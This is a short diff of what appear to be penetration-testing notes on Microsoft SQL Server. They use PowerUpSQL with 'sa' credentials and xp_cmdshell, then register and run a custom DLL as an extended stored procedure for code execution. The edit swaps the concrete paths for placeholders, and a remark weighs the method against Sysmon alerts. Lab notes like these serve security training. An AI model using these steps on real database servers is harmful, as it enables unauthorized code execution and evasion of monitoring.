@@ -254,9 +254,9 @@ Get-SQLQuery -UserName sa -Password Pass –Instance hackme.pal –Query "EXEC x
 Get-SQLStoredProcedureXP -Instance hackme.pal -Verbose   -----    List existing Extended stored procedures:
 
 USE master
-EXEC xp_cmdshell 'mkdir C:\mydll'
-exec sp_addextendedproc 'xp_calc3', 'C:\mydll\xp_calc3.dll'
-exec xp_calc3
+EXEC xp_cmdshell 'mkdir C:\<dll-to-path>'
+exec sp_addextendedproc 'calc', 'C:\<dll-to-path>\<dll-name>.dll'
+exec calc
 
 this method is depreciated, and also is not useful, as it could create an alert if sysmon is enabled.
 ------------------------------------
